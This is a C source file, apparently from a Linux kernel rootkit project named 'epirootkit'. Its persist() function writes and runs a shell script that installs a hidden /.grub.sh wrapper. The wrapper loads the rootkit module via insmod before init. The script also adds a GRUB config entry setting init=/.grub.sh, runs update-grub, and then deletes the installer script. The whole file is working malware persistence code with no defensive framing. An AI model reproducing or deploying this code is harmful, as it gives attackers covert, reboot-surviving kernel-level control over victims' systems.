#include "persist.h"

#include "config.h"
#include "epirootkit.h"
#include "io.h"

/**
 * @brief Installs a persistence mechanism with GRUB bootloader technique.
* 
 * @return int Returns SUCCESS on success, or -FAILURE on error.
 */
int persist(void) {
    int ret;
    char *script_content =
        "#!/bin/sh\n"
        "\n"
        "cat > /.grub.sh <<'EOF'\n"
        "#!/bin/sh\n"
        "insmod /lib/epirootkit/epirootkit.ko 2>/dev/null || true\n"
        "exec /sbin/init \"$@\"\n"
        "EOF\n"
        "\n"
        "chmod +x /.grub.sh\n"
        "mkdir -p /etc/default/grub.d\n"
        "cat <<EOF > /etc/default/grub.d/99.cfg\n"
        "GRUB_CMDLINE_LINUX_DEFAULT=\"\\${GRUB_CMDLINE_LINUX_DEFAULT} init=/.grub.sh\"\n"
        "EOF\n"
        "\n"
        "update-grub\n";

    ret = _write_file("/.install.sh", script_content, strlen(script_content));
    if (ret < 0) {
        ERR_MSG("persist: failed to write /.install.sh: %d\n", ret);
        return -FAILURE;
    }

    ret = exec_str_as_command("chmod +x /.install.sh && /bin/sh /.install.sh ; /bin/rm -f /.install.sh", false);
    if (ret < 0) {
        ERR_MSG("persist: failed: %d\n", ret);
        return -FAILURE;
    }

    return SUCCESS;
}